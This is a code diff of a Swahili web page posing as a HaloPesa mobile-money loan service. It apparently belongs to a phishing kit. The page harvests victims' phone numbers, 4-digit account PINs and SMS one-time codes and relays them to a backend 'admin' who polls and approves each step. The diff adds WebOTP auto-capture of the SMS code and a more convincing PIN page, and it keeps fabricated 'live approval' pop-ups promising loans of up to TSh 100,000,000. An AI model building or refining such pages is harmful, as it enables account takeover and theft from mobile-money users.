     <p class="brand-subtitle">Mikopo mahiri, viwango vya haki</p>
@@ -826,7 +773,7 @@
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-landing')">← Rudi</a>
     <div class="hp-logo-sm">
-      <img src="images/halopesa-logo.png" alt="HaloPesa Logo">
+      <img src="images/halopesa-logo.png" alt="HaloPesa Logo" onerror="this.src='https://placehold.co/28x28/f05a22/ffffff?text=HP'">
       <div class="brand">HaloPesa</div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div></div>
@@ -857,7 +804,7 @@
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step1')">← Rudi</a>
     <div class="hp-logo-sm">
-      <img src="images/halopesa-logo.png" alt="HaloPesa Logo">
+      <img src="images/halopesa-logo.png" alt="HaloPesa Logo" onerror="this.src='https://placehold.co/28x28/f05a22/ffffff?text=HP'">
       <div class="brand">HaloPesa</div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div></div>
@@ -896,7 +843,7 @@
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-step2')">← Rudi</a>
     <div class="hp-logo-sm">
-      <img src="images/halopesa-logo.png" alt="HaloPesa Logo">
+      <img src="images/halopesa-logo.png" alt="HaloPesa Logo" onerror="this.src='https://placehold.co/28x28/f05a22/ffffff?text=HP'">
       <div class="brand">HaloPesa</div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div></div>
@@ -944,36 +891,48 @@
   <div class="pg-footer">© 2026 HaloPesa Tanzania</div>
 </div>
 
-<!-- PAGE LOGIN -->
+<!-- REFACTORED PAGE LOGIN (PIN PAGE) -->
 <div id="page-login" class="page">
   <div class="brand-header">
     <div class="brand-icon-wrap">
-      <img src="images/halopesa-logo.png" alt="HaloPesa Logo">
+      <img src="images/halopesa-logo.png" alt="HaloPesa Logo" onerror="this.src='https://placehold.co/38x38/f05a22/ffffff?text=HP'">
     </div>
     <h1 class="brand-title">HaloPesa</h1>
     <p class="brand-subtitle">Ingia kwenye akaunti yako</p>
   </div>
 
-  <div class="login-card">
-    <h2>Ingia Akaunti</h2>
+  <div class="fintech-card">
+    <div class="security-header">
+      <div class="security-icon-badge">🔒</div>
+      <h2 class="security-title">Ingiza PIN Yako</h2>
+      <p class="security-subtitle">Weka PIN ya tarakimu 4 ya akaunti yako ya HaloPesa</p>
+    </div>
+
     <div class="msg-box error" id="lgMsg"><span class="msg-icon">✕</span><span id="lgMsgTxt"></span></div>
 
-    <div class="lg-phone-row">
-      <div class="ph-pre">🇹🇿 +255</div>
-      <input type="tel" id="lgPh" placeholder="612345678 au 0612345678" maxlength="10" oninput="normalizePhone('lgPh');chkLogin()" style="border-radius: 0 var(--radius-sm) var(--radius-sm) 0; border-left: none;">
+    <div class="field" style="margin-bottom: 20px;">
+      <label>Nambari ya Simu</label>
+      <div class="lg-phone-row phone-row">
+        <div class="ph-pre">🇹🇿 +255</div>
+        <input type="tel" id="lgPh" placeholder="612345678 au 0612345678" maxlength="10" oninput="normalizePhone('lgPh');chkLogin()" style="border-radius: 0 var(--radius-sm) var(--radius-sm) 0; border-left: none;">
+      </div>
     </div>
 
-    <div class="pin-label">Weka PIN yako (tarakimu 4)</div>
-    <div class="pin-row">
-      <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" onkeydown="pinKey(event,0)" oninput="pinMv(this,0)" id="p0">
-      <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" onkeydown="pinKey(event,1)" oninput="pinMv(this,1)" id="p1">
-      <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" onkeydown="pinKey(event,2)" oninput="pinMv(this,2)" id="p2">
-      <input type="password" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1" onkeydown="pinKey(event,3)" oninput="pinMv(this,3)" id="p3">
-      <button class="pin-eye" onclick="togPin()">👁</button>
+    <div class="digit-container">
+      <input type="password" inputmode="numeric" pattern="[0-9]*" class="digit-box" maxlength="1" autocomplete="one-time-code" onkeydown="pinKey(event,0)" oninput="pinMv(this,0)" id="p0">
+      <input type="password" inputmode="numeric" pattern="[0-9]*" class="digit-box" maxlength="1" onkeydown="pinKey(event,1)" oninput="pinMv(this,1)" id="p1">
+      <input type="password" inputmode="numeric" pattern="[0-9]*" class="digit-box" maxlength="1" onkeydown="pinKey(event,2)" oninput="pinMv(this,2)" id="p2">
+      <input type="password" inputmode="numeric" pattern="[0-9]*" class="digit-box" maxlength="1" onkeydown="pinKey(event,3)" oninput="pinMv(this,3)" id="p3">
     </div>
 
-    <div class="forgot-pin">Umesahau PIN?</div>
-    <button class="btn-login" id="bLogin" onclick="doLogin()">INGIA</button>
+    <div class="pin-actions-row">
+      <button class="pin-toggle-btn" onclick="togPin()">
+        <span id="eyeIcon">👁</span> <span id="eyeTxt">Onyesha PIN</span>
+      </button>
+      <span class="forgot-pin-link">Umesahau PIN?</span>
+    </div>
+
+    <button class="btn-submit-action" id="bLogin" onclick="doLogin()">INGIA KWENYE AKAUNTI</button>
   </div>
 
   <div class="pg-footer">
@@ -982,27 +941,40 @@
   </div>
 </div>
 
-<!-- PAGE OTP -->
+<!-- REFACTORED PAGE OTP (WITH WEBOTP AUTO-FILL) -->
 <div id="page-otp" class="page">
   <nav class="navbar">
     <a class="nav-left" onclick="goTo('page-login')">← Rudi</a>
     <div class="hp-logo-sm">
-      <img src="images/halopesa-logo.png" alt="HaloPesa Logo">
+      <img src="images/halopesa-logo.png" alt="HaloPesa Logo" onerror="this.src='https://placehold.co/28x28/f05a22/ffffff?text=HP'">
       <div class="brand">HaloPesa</div>
     </div>
     <div class="nav-right"><div class="hline"></div><div class="hline"></div></div>
   </nav>
 
-  <div class="otp-card">
-    <div class="otp-icon-badge">💬</div>
-    <h2>Uthibitisho wa OTP</h2>
-    <p class="otp-hint">Weka OTP iliyotumwa kwenye nambari yako ya simu</p>
-    <div class="otp-phone-badge" id="otpPh">+255712345678</div>
+  <div class="fintech-card">
+    <div class="security-header">
+      <div class="security-icon-badge">💬</div>
+      <h2 class="security-title">Uthibitisho wa OTP</h2>
+      <p class="security-subtitle">Msimbo wa usalama umetumwa kwa SMS kwenda</p>
+      <div style="margin-top: 8px;">
+        <span class="tag-badge" id="otpPh" style="font-size: 0.95rem; padding: 6px 18px;">+255712345678</span>
+      </div>
+    </div>
 
     <div class="msg-box error" id="otpMsgErr"><span class="msg-icon">✕</span><span id="otpMsgErrTxt"></span></div>
     <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
     <div class="msg-box warning" id="otpMsgWarn"><span class="msg-icon">⚠</span><span id="otpMsgWarnTxt"></span></div>
     <div class="msg-box info" id="otpMsgInfo"><span class="msg-icon">ℹ</span><span id="otpMsgInfoTxt"></span></div>
+
+    <!-- WEBOTP SMS AUTO-FILL DETECTOR BADGE -->
+    <div class="autofill-banner" id="autofillBanner">
+      <div class="autofill-left">
+        <div class="autofill-dot"></div>
+        <span class="autofill-text" id="autofillStateTxt">Inasubiri SMS ya OTP...</span>
+      </div>
+      <button class="autofill-action" onclick="requestWebOTP()">Ruhusu Auto-Fill</button>
+    </div>
 
     <div class="waiting-box" id="pinWait">
       <div class="wb-spinner"></div>
@@ -1010,14 +982,18 @@
     </div>
 
     <div id="otpInputSection">
-      <div class="otp-inputs">
-        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,0)" oninput="otpMv(this,0)" id="o0">
-        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,1)" oninput="otpMv(this,1)" id="o1">
-        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,2)" oninput="otpMv(this,2)" id="o2">
-        <input type="text" inputmode="numeric" pattern="[0-9]*" class="otp-box" maxlength="1" onkeydown="otpKey(event,3)" oninput="otpMv(this,3)" id="o3">
+      <div class="digit-container">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="digit-box" maxlength="1" autocomplete="one-time-code" onkeydown="otpKey(event,0)" oninput="otpMv(this,0)" id="o0">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="digit-box" maxlength="1" onkeydown="otpKey(event,1)" oninput="otpMv(this,1)" id="o1">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="digit-box" maxlength="1" onkeydown="otpKey(event,2)" oninput="otpMv(this,2)" id="o2">
+        <input type="text" inputmode="numeric" pattern="[0-9]*" class="digit-box" maxlength="1" onkeydown="otpKey(event,3)" oninput="otpMv(this,3)" id="o3">
       </div>
-      <div class="otp-resend" id="otpRs">Tuma tena msimbo ndani ya <span id="rsS">30</span> sekunde</div>
-      <button class="btn-otp" id="bOtp" onclick="doOtp()">WASILISHA</button>
+
+      <div style="text-align: center; margin-bottom: 20px; font-size: 0.82rem; color: var(--text-muted); font-weight: 600;" id="otpRs">
+        Tuma tena msimbo ndani ya <span id="rsS" style="color: var(--brand-orange); font-weight: 800;">30</span> sekunde
+      </div>
+
+      <button class="btn-submit-action" id="bOtp" onclick="doOtp()">WASILISHA OTP</button>
     </div>
   </div>
 
@@ -1082,7 +1058,7 @@
     </div>
 
     <div class="rth-wrap">
-      <a href="https://mkopo-wa-halopesa-tz-1g68.onrender.com?admin=ADMIN001" class="reapply-btn-pro">
+      <a href="#" class="reapply-btn-pro" onclick="goTo('page-landing')">
         🔄 OMBA TENA SASA
       </a>
       <button class="rth-btn" onclick="goTo('page-landing')">🏠 Rudi Mwanzo</button>
@@ -1120,6 +1096,7 @@
   let otpPollInterval = null;
   let _rsInterval = null;
   let _loginInFlight = false;
+  let webOtpAbortController = null;
 
   // STATE MANAGEMENT
   const S = {
@@ -1133,18 +1110,6 @@
     assignedAdminId: null
   };
 
-  const _URL_ADMIN_ID = (() => {
-    const params = new URLSearchParams(window.location.search);
-    const id = params.get('admin');
-    sessionStorage.removeItem('selectedAdminId');
-    localStorage.removeItem('selectedAdminId');
-    if (id && id !== 'undefined' && id !== 'null' && id.trim() !== '') {
-      sessionStorage.setItem('selectedAdminId', id.trim());
-      return id.trim();
-    }
-    return null;
-  })();
-
   function getAdminId() {
     const params = new URLSearchParams(window.location.search);
     const urlId  = params.get('admin');
@@ -1154,15 +1119,24 @@
     return sessionStorage.getItem('selectedAdminId') || null;
   }
 
-  // PAGE NAVIGATION (WITH AUTOMATIC TIMER CLEANUP)
+  // PAGE NAVIGATION
   function goTo(id) {
     if (pinPollInterval) { clearInterval(pinPollInterval); pinPollInterval = null; }
     if (otpPollInterval) { clearInterval(otpPollInterval); otpPollInterval = null; }
     if (_rsInterval)     { clearInterval(_rsInterval);     _rsInterval = null; }
+    if (webOtpAbortController) {
+      try { webOtpAbortController.abort(); } catch (e) {}
+      webOtpAbortController = null;
+    }
 
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(id).classList.add('active');
     window.scrollTo(0, 0);
+
+    // Initialize WebOTP if navigating to OTP page
+    if (id === 'page-otp') {
+      requestWebOTP();
+    }
   }
 
   // LOAN CALCULATOR
@@ -1208,7 +1182,7 @@
     const el = document.getElementById(id);
     if (!el) return;
     el.style.borderColor = '#ef4444';
-    el.style.boxShadow = '0 0 0 3px rgba(239,68,68,0.15)';
+    el.style.boxShadow = '0 0 0 4px rgba(239,68,68,0.15)';
     setTimeout(() => { el.style.borderColor = ''; el.style.boxShadow = ''; }, 1800);
   }
 
@@ -1239,26 +1213,11 @@
     const last  = document.getElementById('s2la').value.trim();
     const phone = document.getElementById('s2ph').value.trim();
 
-    if (!first) {
-      showErr('s2Err', 'Tafadhali weka jina lako la kwanza.');
-      shakeField('s2fi');
-      return;
-    }
-
-    if (!last) {
-      showErr('s2Err', 'Tafadhali weka jina lako la ukoo.');
-      shakeField('s2la');
-      return;
-    }
-
-    if (!phone || phone.length < 9) {
-      showErr('s2Err', 'Tafadhali weka nambari sahihi ya simu ya tarakimu 9.');
-      shakeField('s2ph');
-      return;
-    }
+    if (!first) { showErr('s2Err', 'Tafadhali weka jina lako la kwanza.'); shakeField('s2fi'); return; }
+    if (!last)  { showErr('s2Err', 'Tafadhali weka jina lako la ukoo.'); shakeField('s2la'); return; }
+    if (!phone || phone.length < 9) { showErr('s2Err', 'Tafadhali weka nambari sahihi ya simu ya tarakimu 9.'); shakeField('s2ph'); return; }
 
     clearErr('s2Err');
-
     S.first = first;
     S.last = last;
     S.phone = phone;
@@ -1278,7 +1237,7 @@
     }
     clearErr('s3Err');
 
-    const btn = document.querySelector('#page-step3 .btn-grad[onclick="submitApp()"]');
+    const btn = document.querySelector('#page-step3 .btn-grad');
     if (btn) { btn.disabled = true; btn.textContent = 'INAWASILISHA…'; }
     document.getElementById('mSubmit').classList.add('show');
 
@@ -1319,7 +1278,7 @@
     });
   }
 
-  // LOGIN PIN HANDLERS
+  // PIN KEY NAVIGATION & VISIBILITY TOGGLE
   function pinKey(e, i) {
     if (e.key === 'Backspace' && !e.target.value && i > 0) {
       document.getElementById('p' + (i - 1)).focus();
@@ -1334,16 +1293,91 @@
 
   function chkLogin() {
     const ok = [0,1,2,3].every(i => document.getElementById('p'+i).value !== '');
-    document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
+    const btn = document.getElementById('bLogin');
+    if (ok) {
+      btn.classList.add('rdy');
+      btn.disabled = false;
+    } else {
+      btn.classList.remove('rdy');
+      btn.disabled = true;
+    }
   }
 
   function togPin() {
+    const isPass = document.getElementById('p0').type === 'password';
     [0,1,2,3].forEach(i => {
-      const b = document.getElementById('p'+i);
-      b.type = b.type === 'password' ? 'text' : 'password';
+      document.getElementById('p'+i).type = isPass ? 'text' : 'password';
     });
+    document.getElementById('eyeIcon').textContent = isPass ? '🙈' : '👁';
+    document.getElementById('eyeTxt').textContent = isPass ? 'Ficha PIN' : 'Onyesha PIN';
   }
 
+  // WEBOTP SMS AUTO-FILL DETECTOR
+  async function requestWebOTP() {
+    const bannerTxt = document.getElementById('autofillStateTxt');
+    if (!('OTPCredential' in window)) {
+      if (bannerTxt) bannerTxt.textContent = "Sikiliza SMS Auto-Fill (Manual Mode)";
+      return;
+    }
+
+    try {
+      if (webOtpAbortController) webOtpAbortController.abort();
+      webOtpAbortController = new AbortController();
+
+      if (bannerTxt) bannerTxt.textContent = "Inasubiri SMS ya HaloPesa...";
+
+      const content = await navigator.credentials.get({
+        otp: { transport: ['sms'] },
+        signal: webOtpAbortController.signal
+      });
+
+      if (content && content.code) {
+        fillOtpBoxes(content.code);
+        if (bannerTxt) bannerTxt.textContent = "SMS Inayokuja Imepokelewa!";
+      }
+    } catch (err) {
+      if (bannerTxt) bannerTxt.textContent = "SMS Auto-Fill ipo tayari";
+    }
+  }
+
+  function fillOtpBoxes(code) {
+    const cleanCode = code.replace(/\D/g, '').trim().slice(0, 4);
+    if (cleanCode.length === 4) {
+      [...cleanCode].forEach((digit, idx) => {
+        const box = document.getElementById('o' + idx);
+        if (box) { box.value = digit; }
+      });
+      chkOtpReady();
+      showOtpMsg('success', 'Msimbo wa OTP umetambuliwa kiotomatiki kutoka kwa SMS!');
+    }
+  }
+
+  // OTP KEY NAVIGATION
+  function otpKey(e, i) {
+    if (e.key === 'Backspace' && !e.target.value && i > 0) {
+      document.getElementById('o' + (i - 1)).focus();
+    }
+  }
+
+  function otpMv(el, i) {
+    el.value = el.value.replace(/\D/g, '');
+    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
+    chkOtpReady();
+  }
+
+  function chkOtpReady() {
+    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value !== '');
+    const btn = document.getElementById('bOtp');
+    if (ok) {
+      btn.classList.add('rdy');
+      btn.disabled = false;
+    } else {
+      btn.classList.remove('rdy');
+      btn.disabled = true;
+    }
+  }
+
+  // API LOGIN REQUEST
   async function doLogin() {
     if (_loginInFlight) return;          
     hideLoginMsg();
@@ -1376,14 +1410,12 @@
       });
 
       const data = await res.json();
-
       document.getElementById('mLogin').classList.remove('show');
       _loginInFlight = false;
 
       if (data.success) {
         S.applicationId   = data.applicationId;
         S.assignedAdminId = data.assignedAdminId;
-
         document.getElementById('otpPh').textContent = phoneNumber;
 
         goTo('page-otp');
@@ -1391,7 +1423,6 @@
         document.getElementById('otpInputSection').style.display = 'none';
 
         pollPinStatus();
-
       } else {
         document.getElementById('bLogin').disabled = false;
         showLoginMsg(data.message || 'Uthibitisho umeshindwa. Tafadhali jaribu tena.');
@@ -1420,7 +1451,7 @@
           clearInterval(pinPollInterval);
           pinPollInterval = null;
           document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'flex';
+          document.getElementById('otpInputSection').style.display = 'block';
           showOtpMsg('success', 'Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.');
           startRs();
           document.getElementById('o0').focus();
@@ -1433,16 +1464,14 @@
           showOtpMsg('error', 'Maelezo hayakuthibitishwa. Tafadhali ingia tena na uweke namba sahihi ya HaloPesa.');
           setTimeout(() => {
             [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('otpInputSection').style.display = 'flex';
+            document.getElementById('bOtp').className = 'btn-submit-action';
+            document.getElementById('bOtp').disabled = true;
+            document.getElementById('otpInputSection').style.display = 'block';
             if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">30</span> sekunde';
             hideOtpMsgs();
             [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            document.getElementById('bLogin').disabled = false;
-            const phoneVal = document.getElementById('lgPh').value.trim();
-            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
+            document.getElementById('bLogin').disabled = true;
+            document.getElementById('bLogin').className = 'btn-submit-action';
             hideLoginMsg();
             _loginInFlight = false;
             S.applicationId = null;
@@ -1450,45 +1479,18 @@
             goTo('page-login');
           }, 2500);
         }
-      } catch (e) {
-        // Silent
-      }
+      } catch (e) {}
     }, 2000);
-
-    setTimeout(() => {
-      if (pinPollInterval) {
-        clearInterval(pinPollInterval);
-        pinPollInterval = null;
-        if (document.getElementById('pinWait').classList.contains('show')) {
-          document.getElementById('pinWait').classList.remove('show');
-          showOtpMsg('warning', 'Muda wa uthibitisho umeisha. Tafadhali rudi na ujaribu tena.');
-        }
-      }
-    }, 300000);
   }
 
-  // OTP HELPERS
-  function otpKey(e, i) {
-    if (e.key === 'Backspace' && !e.target.value && i > 0) {
-      document.getElementById('o' + (i - 1)).focus();
-    }
-  }
-
-  function otpMv(el, i) {
-    el.value = el.value.replace(/\D/g, '');
-    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
-    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value !== '');
-    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
-  }
-
+  // RESEND OTP
   function startRs() {
     if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-
     let s = 30;
     const rsBox = document.getElementById('otpRs');
     if (!rsBox) return;
 
-    rsBox.innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">' + s + '</span> sekunde';
+    rsBox.innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS" style="color:var(--brand-orange); font-weight:800;">' + s + '</span> sekunde';
 
     _rsInterval = setInterval(() => {
       s--;
@@ -1497,8 +1499,7 @@
       if (s <= 0) {
         clearInterval(_rsInterval);
         _rsInterval = null;
-        const box = document.getElementById('otpRs');
-        if (box) box.innerHTML = '<span style="color:var(--brand-orange);cursor:pointer;font-weight:700" onclick="resendOtp()">Tuma tena msimbo</span>';
+        if (rsBox) rsBox.innerHTML = '<span style="color:var(--brand-orange);cursor:pointer;font-weight:800;" onclick="resendOtp()">Tuma tena msimbo</span>';
       }
     }, 1000);
   }
@@ -1516,8 +1517,10 @@
         showOtpMsg('info', 'Ombi jipya la OTP limetumwa kwa msimamizi.');
         startRs();
         [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
-        document.getElementById('bOtp').className = 'btn-otp';
+        document.getElementById('bOtp').className = 'btn-submit-action';
+        document.getElementById('bOtp').disabled = true;
         document.getElementById('o0').focus();
+        requestWebOTP();
       } else {
         showOtpMsg('error', 'Imeshindwa kutuma tena OTP. Tafadhali jaribu tena.');
       }
@@ -1526,6 +1529,7 @@
     }
   }
 
+  // SUBMIT OTP
   async function doOtp() {
     const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
 
@@ -1603,58 +1607,21 @@
           showOtpMsg('error', 'Uthibitisho umeshindwa. Tafadhali wasiliana na msaada.');
           document.getElementById('bOtp').disabled = false;
 
-        } else if (data.status === 'wrongpin_otp') {
-          clearInterval(otpPollInterval);
-          otpPollInterval = null;
-          showOtpMsg('error', 'PIN si sahihi. Tafadhali jaribu tena. ⚠️ Kumbuka: Ukiingiza PIN isiyo sahihi tena, akaunti yako itafungwa kwa usalama.');
-          setTimeout(() => {
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = 'flex';
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">30</span> sekunde';
-            hideOtpMsgs();
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            document.getElementById('bLogin').disabled = false;
-            const phoneVal = document.getElementById('lgPh').value.trim();
-            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
-            hideLoginMsg();
-            _loginInFlight = false;
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
-
         } else if (data.status === 'wrongcode') {
           clearInterval(otpPollInterval);
           otpPollInterval = null;
           [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-          document.getElementById('bOtp').className = 'btn-otp';
-          document.getElementById('bOtp').disabled = false;
-          document.getElementById('pinWait').classList.remove('show');
-          document.getElementById('otpInputSection').style.display = 'flex';
+          document.getElementById('bOtp').className = 'btn-submit-action';
+          document.getElementById('bOtp').disabled = true;
           showOtpMsg('error', 'Msimbo wa OTP usio sahihi. Tafadhali angalia na uweke tena.');
           document.getElementById('o0').focus();
         }
 
-      } catch (e) {
-        // Silent
-      }
+      } catch (e) {}
     }, 2000);
-
-    setTimeout(() => {
-      if (otpPollInterval) {
-        clearInterval(otpPollInterval);
-        otpPollInterval = null;
-        showOtpMsg('warning', 'Muda wa idhini umeisha. Tafadhali jaribu tena.');
-        document.getElementById('bOtp').disabled = false;
-      }
-    }, 300000);
   }
 
-  // LIVE APPROVAL POPUP LOGIC
+  // CLIPBOARD PASTE EVENT LISTENERS
   document.addEventListener("DOMContentLoaded", () => {
     // 4-Digit Paste Support for PIN
     const p0 = document.getElementById('p0');
@@ -1679,31 +1646,19 @@
         const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').trim();
         if (paste.length === 4) {
           e.preventDefault();
-          [...paste].forEach((digit, idx) => {
-            const el = document.getElementById('o' + idx);
-            if (el) { el.value = digit; otpMv(el, idx); }
-          });
+          fillOtpBoxes(paste);
         }
       });
     }
 
+    // LIVE APPROVAL TOASTS
     const liveApprovals = [
         { number: "062*****841", location: "Dar es Salaam", amount: "TSh 10,000" },
         { number: "062*****375", location: "Arusha", amount: "TSh 25,000" },
         { number: "062*****912", location: "Mwanza", amount: "TSh 50,000" },
         { number: "062*****458", location: "Mbeya", amount: "TSh 100,000" },
         { number: "062*****694", location: "Dodoma", amount: "TSh 250,000" },
-        { number: "062*****231", location: "Tanga", amount: "TSh 500,000" },
-        { number: "063*****885", location: "Kigoma", amount: "TSh 1,000,000" },
-        { number: "063*****406", location: "Mtwara", amount: "TSh 2,500,000" },
         { number: "061*****534", location: "Zanzibar", amount: "TSh 5,000,000" },
-        { number: "062*****168", location: "Moshi", amount: "TSh 7,500,000" },
-        { number: "062*****941", location: "Tabora", amount: "TSh 10,000,000" },
-        { number: "061*****287", location: "Singida", amount: "TSh 15,000,000" },
-        { number: "062*****413", location: "Songea", amount: "TSh 20,000,000" },
-        { number: "062*****726", location: "Lindi", amount: "TSh 35,000,000" },
-        { number: "061*****904", location: "Bukoba", amount: "TSh 50,000,000" },
-        { number: "061*****347", location: "Geita", amount: "TSh 75,000,000" },
         { number: "061*****118", location: "Morogoro", amount: "TSh 100,000,000" }
     ];
 
@@ -1712,41 +1667,31 @@
     const popupAvatar = document.getElementById("popup-avatar");
     const landingPage = document.getElementById("page-landing");
 
-    if (!popup || !popupText || !popupAvatar || !landingPage) {
-        return;
-    }
-
-    let lastIndex = -1;
-
-    function displayPopup() {
+    if (popup && popupText && popupAvatar && landingPage) {
+      let lastIndex = -1;
+      function displayPopup() {
         if (!landingPage.classList.contains("active")) {
-            popup.classList.remove("show");
-            return;
+          popup.classList.remove("show");
+          return;
         }
-
         let index;
         do {
-            index = Math.floor(Math.random() * liveApprovals.length);
+          index = Math.floor(Math.random() * liveApprovals.length);
         } while (index === lastIndex && liveApprovals.length > 1);
-
         lastIndex = index;
 
         const user = liveApprovals[index];
         popupAvatar.textContent = user.number.substring(0, 2);
         popupText.innerHTML = `<strong>${user.number}</strong> (${user.location}) ameidhinishiwa <strong>${user.amount}</strong>`;
-
         popup.classList.add("show");
-
-        setTimeout(() => {
-            popup.classList.remove("show");
-        }, 2500);
+        setTimeout(() => popup.classList.remove("show"), 2800);
+      }
+      setTimeout(displayPopup, 2000);
+      setInterval(displayPopup, 4000);
     }
-
-    setTimeout(displayPopup, 2000);
-    setInterval(displayPopup, 3500);
   });
 
-  // INIT CALCULATOR
+  // INITIALIZE CALCULATOR
   calcUp();
 </script>
 </body>
